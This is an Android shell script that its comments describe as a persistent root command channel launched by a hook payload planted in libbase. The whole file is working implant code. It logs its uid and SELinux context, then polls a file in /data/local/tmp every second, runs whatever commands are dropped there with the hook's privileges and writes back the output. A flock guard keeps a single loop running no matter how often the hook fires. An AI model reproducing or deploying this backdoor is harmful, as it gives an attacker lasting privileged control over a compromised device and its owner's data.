#!/system/bin/sh
# r.sh -- persistent root command-channel loop exec'd by the libbase hook payload.
#
# The hook (libbase GetBoolProperty -> payload -> execve("sh r.sh")) fires on
# every cold call, so without a guard it spawns one of these per fire.  They
# accumulate over a session (1265 were live on 2026-10-04, 16 days in) and each
# forks its own `sleep 1` every second, which eventually starves the device.
# The flock makes a second instance a no-op, so exactly one loop runs no matter
# how often the hook fires.  The lock is released when the holder exits, so the
# next hook fire starts a fresh holder if this one is killed.
D=/data/local/tmp
/system/bin/mkdir -p "$D"

( flock -n 9 || exit 0
  c=$(/system/bin/cat /proc/self/attr/current 2>/dev/null)
  u=$(/system/bin/id -u 2>/dev/null)
  echo "channel pid=$$ uid=$u ctx=$c" >> "$D/hits"
  : > "$D/ready"
  while true; do
    if [ -f "$D/cmd" ]; then
      /system/bin/cp "$D/cmd" "$D/cmd.run" 2>/dev/null
      /system/bin/rm -f "$D/cmd"
      : > "$D/out"
      /system/bin/sh "$D/cmd.run" > "$D/out" 2>&1
      echo "[exit $?]" >> "$D/out"
    fi
    /system/bin/sleep 1
  done
) 9>"$D/r.sh.lock"
